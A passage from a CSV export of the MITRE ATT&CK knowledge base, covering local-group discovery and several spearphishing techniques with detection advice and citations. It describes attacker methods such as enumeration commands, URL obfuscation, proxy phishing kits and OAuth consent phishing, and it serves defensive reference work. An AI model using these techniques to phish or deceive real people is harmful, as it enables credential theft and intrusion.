Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1069,,"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,"(Citation: Savill 1999),(Citation: Symantec Orangeworm April 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec Buckeye),(Citation: SecureList Griffon May 2019),(Citation: FireEye APT34 Dec 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CISA SoreFang July 2016),(Citation: CISA WellMess July 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: Secureworks REvil September 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CME Github September 2018),(Citation: Symantec Bumblebee June 2022),(Citation: FireEye FIN6 Apr 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Symantec Inception Framework March 2018),(Citation: Kaspersky Sodin July 2019),(Citation: Microsoft BlackCat Jun 2022),(Citation: Palo Alto OilRig May 2016),(Citation: TechNet Dsquery),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant APT41),(Citation: CrowdStrike BloodHound April 2018),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: US-CERT TA18-074A),(Citation: Intrinsec Egregor Nov 2020),(Citation: Mandiant FIN7 Apr 2022),(Citation: ESET ComRAT May 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: McAfee Sodinokibi October 2019),"
T1069.001,attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b,Permission Groups Discovery: Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",https://attack.mitre.org/techniques/T1069/001,12 March 2020,07 April 2023,enterprise-attack,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1069,,"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,"(Citation: TrendMicro Tonto Team October 2020),(Citation: Savill 1999),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Unit 42 Kazuar May 2017),(Citation: Symantec Orangeworm April 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec Buckeye),(Citation: NCC Group Chimera January 2021),(Citation: FireEye APT34 Dec 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: GitHub PoshC2),(Citation: Trend Micro Black Basta October 2022),(Citation: Emissary Trojan Feb 2016),(Citation: FoxIT Wocao December 2019),(Citation: Kaspersky Turla Aug 2014),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky QakBot September 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: CrowdStrike BloodHound April 2018),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye admin@338),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET ComRAT May 2020),(Citation: Korean FSI TA505 2020),(Citation: Baumgartner Naikon 2015),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),"
T1598.002,attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc,Phishing for Information: Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/002,02 October 2020,15 April 2021,enterprise-attack,1.1,Reconnaissance,"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee",,,,,,"(Citation: Rewterz Sidewinder APT April 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: US-CERT TA18-074A),(Citation: ATT Sidewinder January 2021),(Citation: Cyble Sidewinder September 2020),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)"
T1598.003,attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230,Phishing for Information: Spearphishing Link,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also link to ""web bugs"" or ""web beacons"" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug)

Adversaries may also be able to spoof a complete website using what is known as a ""browser-in-the-browser"" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)

Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to proxy the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)

From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/003,02 October 2020,02 October 2023,enterprise-attack,1.5,Reconnaissance,"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Austin Herrin; Elpidoforos Maragkos, @emaragkos; Joas Antonio dos Santos, @C0d3Cr4zy; Menachem Goldstein; Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee",,,,,,"(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: AADInternals Documentation),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: Proofpoint TA453 March 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Google Iran Threats October 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Volexity Patchwork June 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Certfa Charming Kitten January 2021),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Proofpoint TA407 September 2019),(Citation: Phish Labs Silent Librarian),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: ATT Sidewinder January 2021),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: DOJ Iran Indictments March 2018),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Microsoft Targeting Elections September 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: Proofpoint TA453 July2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)"
T1598.001,attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6,Phishing for Information: Spearphishing Service,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/001,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Robert Simmons, @MalwareUtkonos",,,,,,"(Citation: Crowdstrike TELCO BPO Campaign December 2022),"
T1598.004,attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289,Phishing for Information: Spearphishing Voice,"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.

All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or ""vishing""), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)

Victims may also receive phishing messages that direct them to call a phone number (""callback phishing"") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)

Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",https://attack.mitre.org/techniques/T1598/004,07 September 2023,08 September 2023,enterprise-attack,1.0,Reconnaissance,,PRE,Application Log: Application Log Content,True,T1598,,,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: CISA Phishing)"
T1566.001,attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597,Phishing: Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",https://attack.mitre.org/techniques/T1566/001,02 March 2020,30 March 2023,enterprise-attack,2.2,Initial Access,"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.

Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)","Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,Philip Winther,,,,,,"(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Talos Emotet Jan 2019),(Citation: Unit 42 Inception November 2018),(Citation: Unit 42 Phishery Aug 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Telefonica Snip3 December 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Talos Group123),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Trend Micro Tick November 2019),(Citation: HP SVCReady Jun 2022),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: Zscaler Higaisa 2020),(Citation: IBM IcedID November 2017),(Citation: Cymmetria Patchwork),(Citation: Symantec Inception Framework March 2018),(Citation: Accenture MUDCARP March 2019),(Citation: TrendMicro Trickbot Feb 2019),(Citation: ESET Nomadic Octopus 2018),(Citation: Ukraine15 - EISAC - 201603),(Citation: Talos Lokibot Jan 2021),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: SecureWorks August 2019),(Citation: Trend Micro IXESHE 2012),(Citation: Picus Sodinokibi January 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Symantec Gallmaker Oct 2018),(Citation: Unit 42 ProjectM March 2016),(Citation: FireEye APT19),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye admin@338),(Citation: Talos Frankenstein June 2019),(Citation: FireEye APT30),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Proofpoint TA505 June 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: CitizenLab Tropic Trooper Aug 2018),(Citation: Symantec Chafer February 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Talos Bisonal Mar 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Proofpoint TA459 April 2017),(Citation: CheckPoint Bandook Nov 2020),(Citation: McAfee Sodinokibi October 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Microsoft Actinium February 2022),(Citation: FireEye APT10 Sept 2018),(Citation: TrendMicro TropicTrooper 2015),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: FireEye Metamorfo Apr 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FireEye APT41 Aug 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Checkpoint IndigoZebra July 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA2541 February 2022),(Citation: Proofpoint TA416 November 2020),(Citation: TrendMicro Gamaredon April 2020),(Citation: Securelist Machete Aug 2014),(Citation: Flashpoint FIN 7 March 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT32 April 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: Kaspersky MoleRATs April 2019),(Citation: FireEye FIN7 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Moran 2014),(Citation: Securelist ScarCruft May 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: Anomali Pirate Panda April 2020),(Citation: SecureList Silence Nov 2017),(Citation: SANS Windshift August 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: FireEye Fin8 May 2016),(Citation: MSTIC NOBELIUM May 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Sofacy DealersChoice),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: US-CERT Ukraine Feb 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Talos PoetRAT April 2020),(Citation: G Data Sodinokibi June 2019),(Citation: Unit 42 Gamaredon February 2022),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye Hancitor),(Citation: CIS Emotet Apr 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: ESET Machete July 2019),(Citation: Group IB RTM August 2019),(Citation: Symantec Emotet Jul 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Mandiant APT1),(Citation: Cyberint Qakbot May 2021),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: DOJ FIN7 Aug 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: VirusBulletin Kimsuky October 2019),(Citation: McAfee Bankshot),(Citation: CSM Elderwood Sept 2012),(Citation: Palo Alto Sofacy 06-2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Group IB Silence Sept 2018),(Citation: Juniper IcedID June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro Taidoor),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Gamaredon June 2020),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Check Point Rocket Kitten),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Grim Spider May 2019),(Citation: ATT Sidewinder January 2021),(Citation: ESET OceanLotus),(Citation: ESET T3 Threat Report 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Secureworks GOLD CABIN),(Citation: ESET Operation Spalax Jan 2021),(Citation: RiskIQ Cobalt Nov 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Oblique RAT March 2021),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Lazarus APT January 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Proofpoint Cobalt June 2017),(Citation: Cylance Sodinokibi July 2019),(Citation: Cybereason TA505 April 2019),(Citation: Secureworks IRON TILDEN Profile),(Citation: iSight Sandworm Oct 2014),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: F-Secure The Dukes),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Malwarebytes Higaisa 2020),(Citation: Malwarebytes Emotet Dec 2017),(Citation: FireEye APT39 Jan 2019),(Citation: Secureworks REvil September 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Proofpoint TA505 October 2019),(Citation: Securelist Darkhotel Aug 2015),(Citation: Talos Kimsuky Nov 2021),(Citation: Unit 42 Valak July 2020),(Citation: Talos Transparent Tribe May 2021),(Citation: FireEye Obfuscation June 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Volexity Patchwork June 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Group IB Ransomware September 2020),(Citation: Qualys LolZarus),(Citation: Malwarebytes Pony April 2016),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: ATT QakBot April 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Rancor Unit42 June 2018),(Citation: US-CERT Emotet Jul 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Unit42 Redaman January 2019),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cisco Operation Layover September 2021),(Citation: Visa FIN6 Feb 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT10 April 2017),(Citation: 360 Machete Sep 2020),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Symantec Tick Apr 2016),(Citation: Proofpoint TA505 Sep 2017),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft Holmium June 2020),(Citation: Google EXOTIC LILY March 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Securelist Dropping Elephant),(Citation: Deep Instinct Black Basta August 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: Anomali Static Kitten February 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Kroll Qakbot June 2020),(Citation: IBM TA505 April 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: eSentire FIN7 July 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)"
T1566.002,attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7,Phishing: Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)",https://attack.mitre.org/techniques/T1566/002,02 March 2020,06 September 2023,enterprise-attack,2.5,Initial Access,"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Google Workspace, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Kobi Haimovich, CardinalOps; Mark Wee; Menachem Goldstein; Philip Winther; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)",,,,,,"(Citation: Talos Emotet Jan 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: Telefonica Snip3 December 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: SentinelOne Valak June 2020),(Citation: FireEye Clandestine Wolf),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Certfa Charming Kitten January 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Zscaler Bazar September 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Microsoft Unidentified Dec 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Volexity Ocean Lotus November 2020),(Citation: Kaspersky Emotet Jan 2019),(Citation: FireEye Hacking 